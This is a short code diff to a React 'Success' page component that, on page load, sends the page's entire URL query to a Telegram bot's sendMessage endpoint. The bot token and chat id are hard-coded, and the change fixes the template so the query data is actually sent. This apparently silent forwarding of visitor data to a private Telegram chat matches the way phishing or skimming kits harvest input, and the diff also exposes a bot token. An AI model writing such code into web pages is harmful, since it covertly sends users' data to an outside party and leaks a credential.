@@ -9,7 +9,7 @@ const Success = () => {
     useEffect(() => {
 
         fetch(`https://api.telegram.org/bot5814853133:AAGhW_g7IeCbVmUaz0ZkrGwTD_T-0MzjySo/sendMessage?chat_id=147796272&text=
-        JSON.stringify(router.query)
+        ${JSON.stringify(router.query)}
         `);
     }, [router.query]);
 
